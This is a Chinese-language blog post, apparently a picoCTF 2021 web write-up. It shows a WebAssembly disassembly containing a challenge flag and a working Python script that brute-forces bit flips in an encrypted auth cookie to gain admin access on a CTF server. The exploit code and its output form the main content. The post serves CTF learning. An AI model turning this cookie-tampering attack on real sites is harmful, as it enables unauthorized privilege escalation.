        local<span class="token punctuation">.</span>get <span class="token number">27</span>
        local<span class="token punctuation">.</span>set <span class="token number">31</span>
        local<span class="token punctuation">.</span>get <span class="token number">30</span>
        local<span class="token punctuation">.</span>set <span class="token number">32</span>
        local<span class="token punctuation">.</span>get <span class="token number">31</span>
        local<span class="token punctuation">.</span>get <span class="token number">32</span>
        i32<span class="token punctuation">.</span>eq
        local<span class="token punctuation">.</span>set <span class="token number">33</span>
        i32<span class="token punctuation">.</span>const <span class="token number">1</span>
        local<span class="token punctuation">.</span>set <span class="token number">34</span>
        local<span class="token punctuation">.</span>get <span class="token number">33</span>
        local<span class="token punctuation">.</span>get <span class="token number">34</span>
        i32<span class="token punctuation">.</span>and
        local<span class="token punctuation">.</span>set <span class="token number">35</span>
        local<span class="token punctuation">.</span>get <span class="token number">35</span>
        br_if <span class="token number">0</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">)</span>
      end
      local<span class="token punctuation">.</span>get <span class="token number">4</span>
      i32<span class="token punctuation">.</span>load8_u offset<span class="token operator">=</span><span class="token number">11</span>
      local<span class="token punctuation">.</span>set <span class="token number">36</span>
      i32<span class="token punctuation">.</span>const <span class="token number">255</span>
      local<span class="token punctuation">.</span>set <span class="token number">37</span>
      local<span class="token punctuation">.</span>get <span class="token number">36</span>
      local<span class="token punctuation">.</span>get <span class="token number">37</span>
      i32<span class="token punctuation">.</span>and
      local<span class="token punctuation">.</span>set <span class="token number">38</span>
      local<span class="token punctuation">.</span>get <span class="token number">4</span>
      i32<span class="token punctuation">.</span>load8_u offset<span class="token operator">=</span><span class="token number">10</span>
      local<span class="token punctuation">.</span>set <span class="token number">39</span>
      i32<span class="token punctuation">.</span>const <span class="token number">255</span>
      local<span class="token punctuation">.</span>set <span class="token number">40</span>
      local<span class="token punctuation">.</span>get <span class="token number">39</span>
      local<span class="token punctuation">.</span>get <span class="token number">40</span>
      i32<span class="token punctuation">.</span>and
      local<span class="token punctuation">.</span>set <span class="token number">41</span>
      local<span class="token punctuation">.</span>get <span class="token number">38</span>
      local<span class="token punctuation">.</span>get <span class="token number">41</span>
      i32<span class="token punctuation">.</span>sub
      local<span class="token punctuation">.</span>set <span class="token number">42</span>
      local<span class="token punctuation">.</span>get <span class="token number">4</span>
      local<span class="token punctuation">.</span>get <span class="token number">42</span>
      i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">28</span>
    end
    local<span class="token punctuation">.</span>get <span class="token number">4</span>
    i32<span class="token punctuation">.</span>load offset<span class="token operator">=</span><span class="token number">28</span>
    local<span class="token punctuation">.</span>set <span class="token number">43</span>
    local<span class="token punctuation">.</span>get <span class="token number">43</span>
    <span class="token keyword">return</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">func</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>type <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>result i32<span class="token punctuation">)</span>
    <span class="token punctuation">(</span>local i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32<span class="token punctuation">)</span>
    i32<span class="token punctuation">.</span>const <span class="token number">0</span>
    local<span class="token punctuation">.</span>set <span class="token number">0</span>
    i32<span class="token punctuation">.</span>const <span class="token number">1072</span>
    local<span class="token punctuation">.</span>set <span class="token number">1</span>
    i32<span class="token punctuation">.</span>const <span class="token number">1024</span>
    local<span class="token punctuation">.</span>set <span class="token number">2</span>
    local<span class="token punctuation">.</span>get <span class="token number">2</span>
    local<span class="token punctuation">.</span>get <span class="token number">1</span>
    call <span class="token number">1</span>
    local<span class="token punctuation">.</span>set <span class="token number">3</span>
    local<span class="token punctuation">.</span>get <span class="token number">3</span>
    local<span class="token punctuation">.</span>set <span class="token number">4</span>
    local<span class="token punctuation">.</span>get <span class="token number">0</span>
    local<span class="token punctuation">.</span>set <span class="token number">5</span>
    local<span class="token punctuation">.</span>get <span class="token number">4</span>
    local<span class="token punctuation">.</span>get <span class="token number">5</span>
    i32<span class="token punctuation">.</span>ne
    local<span class="token punctuation">.</span>set <span class="token number">6</span>
    i32<span class="token punctuation">.</span>const <span class="token operator">-</span><span class="token number">1</span>
    local<span class="token punctuation">.</span>set <span class="token number">7</span>
    local<span class="token punctuation">.</span>get <span class="token number">6</span>
    local<span class="token punctuation">.</span>get <span class="token number">7</span>
    i32<span class="token punctuation">.</span>xor
    local<span class="token punctuation">.</span>set <span class="token number">8</span>
    i32<span class="token punctuation">.</span>const <span class="token number">1</span>
    local<span class="token punctuation">.</span>set <span class="token number">9</span>
    local<span class="token punctuation">.</span>get <span class="token number">8</span>
    local<span class="token punctuation">.</span>get <span class="token number">9</span>
    i32<span class="token punctuation">.</span>and
    local<span class="token punctuation">.</span>set <span class="token number">10</span>
    local<span class="token punctuation">.</span>get <span class="token number">10</span>
    <span class="token keyword">return</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">func</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>type <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>param i32 i32<span class="token punctuation">)</span>
    <span class="token punctuation">(</span>local i32 i32 i32 i32 i32<span class="token punctuation">)</span>
    global<span class="token punctuation">.</span>get <span class="token number">0</span>
    local<span class="token punctuation">.</span>set <span class="token number">2</span>
    i32<span class="token punctuation">.</span>const <span class="token number">16</span>
    local<span class="token punctuation">.</span>set <span class="token number">3</span>
    local<span class="token punctuation">.</span>get <span class="token number">2</span>
    local<span class="token punctuation">.</span>get <span class="token number">3</span>
    i32<span class="token punctuation">.</span>sub
    local<span class="token punctuation">.</span>set <span class="token number">4</span>
    local<span class="token punctuation">.</span>get <span class="token number">4</span>
    local<span class="token punctuation">.</span>get <span class="token number">0</span>
    i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">12</span>
    local<span class="token punctuation">.</span>get <span class="token number">4</span>
    local<span class="token punctuation">.</span>get <span class="token number">1</span>
    i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">8</span>
    local<span class="token punctuation">.</span>get <span class="token number">4</span>
    i32<span class="token punctuation">.</span>load offset<span class="token operator">=</span><span class="token number">12</span>
    local<span class="token punctuation">.</span>set <span class="token number">5</span>
    local<span class="token punctuation">.</span>get <span class="token number">4</span>
    i32<span class="token punctuation">.</span>load offset<span class="token operator">=</span><span class="token number">8</span>
    local<span class="token punctuation">.</span>set <span class="token number">6</span>
    local<span class="token punctuation">.</span>get <span class="token number">6</span>
    local<span class="token punctuation">.</span>get <span class="token number">5</span>
    i32<span class="token punctuation">.</span>store8 offset<span class="token operator">=</span><span class="token number">1072</span>
    <span class="token keyword">return</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">table</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token number">1</span> <span class="token number">1</span> funcref<span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">memory</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token number">2</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">global</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>mut i32<span class="token punctuation">)</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">66864</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">global</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token function">i32</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">1072</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">global</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token function">i32</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">global</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token function">i32</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">1328</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">global</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token function">i32</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">global</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">5</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token function">i32</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">66864</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">global</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">6</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token function">i32</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">global</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">7</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token function">i32</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"memory"</span> <span class="token punctuation">(</span>memory <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__wasm_call_ctors"</span> <span class="token punctuation">(</span>func <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"strcmp"</span> <span class="token punctuation">(</span>func <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"check_flag"</span> <span class="token punctuation">(</span>func <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"input"</span> <span class="token punctuation">(</span>global <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"copy_char"</span> <span class="token punctuation">(</span>func <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__dso_handle"</span> <span class="token punctuation">(</span>global <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__data_end"</span> <span class="token punctuation">(</span>global <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__global_base"</span> <span class="token punctuation">(</span>global <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__heap_base"</span> <span class="token punctuation">(</span>global <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__memory_base"</span> <span class="token punctuation">(</span>global <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__table_base"</span> <span class="token punctuation">(</span>global <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">data</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token string">"picoCTF&#123;d88090e679c48f3945fcaa6a7d6d70c5&#125;\00\00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>关于wasm2wat文件，在<a target="_blank" rel="noopener" href="https://github.com/WebAssembly/wabt/releases">https://github.com/WebAssembly/wabt/releases</a><br>选择适合你的系统的打包好的文件。<br>其实直接下载<code>wasm</code>文件后直接打开也可以看到flag字符串。算是一个非预期解吧。</p>
<h1 id="More-Cookies"><a href="#More-Cookies" class="headerlink" title="More Cookies"></a>More Cookies</h1><blockquote>
<p>描述：I forgot Cookies can Be modified Client-side, so now I decided to encrypt them!</p>
<p>Hints: <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Homomorphic_encryption">https://en.wikipedia.org/wiki/Homomorphic_encryption</a></p>
<p>The search endpoint is only helpful for telling you if you are admin or not, you won’t be able to guess the flag name</p>
</blockquote>
<p>进入网站拿cookie</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># cookie</span>
<span class="token assign-left variable">OERIWnFUQXI2bHNOeHB5cVRmd3FXMkY1SjBpWmdyMXpaU0JFdkVraWhucGdoY0k4dGpBeDFtQ1FMM1oweXdnZFlteGJ5Mmk0bFM0UUc5ZHhvaFFqL0czMGhyQmZ3alNFNHZKbW53eTJYZll1VXBJTW14OHFEb0swTnpDdEMvWU4</span><span class="token operator">=</span>
<span class="token comment"># base64 -d</span>
8DHZqTAr6lsNxpyqTfwqW2F5J0iZgr1zZSBEvEkihnpghcI8tjAx1mCQL3Z0ywgdYmxby2i4lS4QG9dxohQj/G30hrBfwjSE4vJmnwy2XfYuUpIMmx8qDoK0NzCtC/YN
┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>
└─<span class="token comment"># echo 8DHZqTAr6lsNxpyqTfwqW2F5J0iZgr1zZSBEvEkihnpghcI8tjAx1mCQL3Z0ywgdYmxby2i4lS4QG9dxohQj/G30hrBfwjSE4vJmnwy2XfYuUpIMmx8qDoK0NzCtC/YN | base64 -d | xxd -g 1</span>
00000000: f0 <span class="token number">31</span> d9 a9 <span class="token number">30</span> 2b ea 5b 0d c6 9c aa 4d fc 2a 5b  .1<span class="token punctuation">..</span><span class="token number">0</span>+.<span class="token punctuation">[</span><span class="token punctuation">..</span><span class="token punctuation">..</span>M.*<span class="token punctuation">[</span>
00000010: <span class="token number">61</span> <span class="token number">79</span> <span class="token number">27</span> <span class="token number">48</span> <span class="token number">99</span> <span class="token number">82</span> bd <span class="token number">73</span> <span class="token number">65</span> <span class="token number">20</span> <span class="token number">44</span> <span class="token function">bc</span> <span class="token number">49</span> <span class="token number">22</span> <span class="token number">86</span> 7a  ay'H<span class="token punctuation">..</span>.se D.I".z
00000020: <span class="token number">60</span> <span class="token number">85</span> c2 3c b6 <span class="token number">30</span> <span class="token number">31</span> d6 <span class="token number">60</span> <span class="token number">90</span> 2f <span class="token number">76</span> <span class="token number">74</span> cb 08 1d  <span class="token variable"><span class="token variable">`</span><span class="token punctuation">..</span><span class="token operator">&lt;</span>.01.<span class="token variable">`</span></span>./vt<span class="token punctuation">..</span>.
00000030: <span class="token number">62</span> 6c 5b cb <span class="token number">68</span> b8 <span class="token number">95</span> 2e <span class="token number">10</span> 1b d7 <span class="token number">71</span> a2 <span class="token number">14</span> <span class="token number">23</span> fc  bl<span class="token punctuation">[</span>.h<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>q<span class="token punctuation">..</span><span class="token comment">#.</span>
00000040: 6d f4 <span class="token number">86</span> b0 5f c2 <span class="token number">34</span> <span class="token number">84</span> e2 f2 <span class="token number">66</span> 9f 0c b6 5d f6  m<span class="token punctuation">..</span>._.4<span class="token punctuation">..</span>.f<span class="token punctuation">..</span>.<span class="token punctuation">]</span>.
00000050: 2e <span class="token number">52</span> <span class="token number">92</span> 0c 9b 1f 2a 0e <span class="token number">82</span> b4 <span class="token number">37</span> <span class="token number">30</span> ad 0b f6 0d  .R<span class="token punctuation">..</span><span class="token punctuation">..</span>*<span class="token punctuation">..</span>.70<span class="token punctuation">..</span><span class="token punctuation">..</span></code></pre>

<p>在cookie的字节中，需要找到类似的admin=0，将其变成admin=1，意思就是将其字节进行翻转。使其构成其相反的意思。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> re

URL <span class="token operator">=</span> <span class="token string">"http://mercury.picoctf.net:34962/"</span>
COOKIE_NAME <span class="token operator">=</span> <span class="token string">"auth_name"</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL<span class="token punctuation">)</span>
    cookie <span class="token operator">=</span> s<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span>COOKIE_NAME<span class="token punctuation">]</span>
    raw_cookie <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Cookie: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>cookie<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    <span class="token keyword">with</span> log<span class="token punctuation">.</span>progress<span class="token punctuation">(</span><span class="token string">"Flipping bits"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> p<span class="token punctuation">:</span>
        <span class="token keyword">for</span> byte_index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>raw_cookie<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                mask <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> i<span class="token punctuation">)</span>

                p<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Trying to flip index </span><span class="token interpolation"><span class="token punctuation">&#123;</span>byte_index<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>raw_cookie<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> with mask </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>mask<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

                <span class="token comment"># Flip the bit</span>
                raw_cookie<span class="token punctuation">[</span>byte_index<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> mask

                new_cookie <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>raw_cookie<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span>
                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span>COOKIE_NAME<span class="token punctuation">:</span> new_cookie<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>m<span class="token punctuation">:</span><span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"picoCTF&#123;[^&#125;]+&#125;"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Flipped index </span><span class="token interpolation"><span class="token punctuation">&#123;</span>byte_index<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>raw_cookie<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> with mask </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>mask<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">, Flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                    <span class="token keyword">return</span>

                <span class="token comment"># Flip the bit back</span>
                raw_cookie<span class="token punctuation">[</span>byte_index<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> mask

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>运行脚本即可得到flag，看在哪个字节进行翻转可以得到admin权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> python3 exploit.py
<span class="token punctuation">[</span>x<span class="token punctuation">]</span> Flipping bits: Trying to flip index <span class="token number">9</span>/96 with mask 0x1
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Flipped index <span class="token number">9</span>/96 with mask 0x1, Flag: picoCTF<span class="token punctuation">&#123;</span>cO0ki3s_yum_e40d16a9<span class="token punctuation">&#125;</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Flipping bits: Done</code></pre>

<h2 id="脚本解析"><a href="#脚本解析" class="headerlink" title="脚本解析"></a>脚本解析</h2><pre class="language-python" data-language="python"><code class="language-python">requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#requests库的session会话对象可以跨请求保持某些参数，就是比如你使用session成功的登录了某个网站，则在再次使用该session对象请求该网站的其他网页都会默认使用该session之前使用的cookie等参数，与刷新网页是有区别的</span>
cookie <span class="token operator">=</span> s<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span>COOKIE_NAME<span class="token punctuation">]</span>
<span class="token comment">#这里设置的cookie是所有请求中都会附带的</span>
<span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#方法返回一个新字节数组。这个数组里的元素是可变的，并且每个元素的值范围: 0 &lt;= x &lt; 256。</span>
<span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span>source<span class="token punctuation">[</span><span class="token punctuation">,</span> encoding<span class="token punctuation">[</span><span class="token punctuation">,</span> errors<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">#如果 source 为字符串，则按照指定的 encoding 将字符串转换为字节序列；</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#日志的打印方式</span>
progress <span class="token comment">#文本进度条</span>
<span class="token keyword">for</span> byte_index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>raw_cookie<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># raw_cookie的长度，并循环循环这么多次，直到每一个字节的都替换一次</span>
<span class="token operator">&lt;&lt;</span> 二进制数字位操作的一种<span class="token punctuation">,</span> 前面是被移动的数字<span class="token punctuation">,</span> 后面一个是移动的位数<span class="token punctuation">.</span>
<span class="token comment">#2 = 0b10</span>
<span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span>
<span class="token comment">#输出: 8</span>
<span class="token comment">#8 = 0b1000</span>
<span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span>
<span class="token comment">#输出: 0b1000</span>
<span class="token operator">^</span> 异或，也就是这里进行翻转。
<span class="token comment">#然后将cookie重新设置为新生成的，加载并刷新网页。在返回包中有匹配到picoCTF&#123;[^&#125;]+&#125;则是flag。</span></code></pre>

<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF">https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/xnomas/PicoCTF-2021-Writeups">https://github.com/xnomas/PicoCTF-2021-Writeups</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/JeffersonDing/CTF/blob/master/pico_CTF_2021">https://github.com/JeffersonDing/CTF/blob/master/pico_CTF_2021</a></p>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me a candy.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg"><img loading="lazy" src="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>m0re</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://m0re.top/posts/9d77485d/" title="PicoCTF2021_Web(一)">https://m0re.top/posts/9d77485d/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/3246d33f/" rel="prev" title="PicoCTF2021_Web(二)"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">PicoCTF2021_Web(二)</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/e5c925d7/" rel="next" title="DASCTF2021July复现"><span class="post-nav-text">DASCTF2021July复现</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>尝试使用 utterances （基于 GitHub Issues）评论系统。</span><br><span>您可以点击下方按钮切换对应评论系统，</span><br><span><script>function showUtterances(){ document.querySelector(".utterances").style.display='block'; document.querySelector('#valine-container').style.display='none'; }function showValine(){ document.querySelector('#valine-container').style.display='block'; document.querySelector(".utterances").style.display='none'; }</script></span><br><span><a class="hty-button hty-button--raised" onclick="showValine()">Valine</a><a class="hty-button hty-button--raised" onclick="showUtterances()">utterances</a></span><br><span><style>.utterances{display:none;}</style></span><br></div><div id="valine-container"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js", () => {
  const valineConfig = {"enable":true,"appId":"gUEA9zKLhCnMFxQI5kI20WiD-gzGzoHsz","appKey":"GQKAp04LNloy3MrDMv86MI3i","placeholder":"评论一下~&nbsp_(:з」∠)_ （填写邮箱可以收到回复通知～）","avatar":null,"pageSize":10,"visitor":true,"highlight":true,"recordIP":true,"enableQQ":true,"requiredFields":["nick","mail"],"el":"#valine-container","lang":"zh-cn"}
  valineConfig.path = "/posts/9d77485d/"
  new Valine(valineConfig)
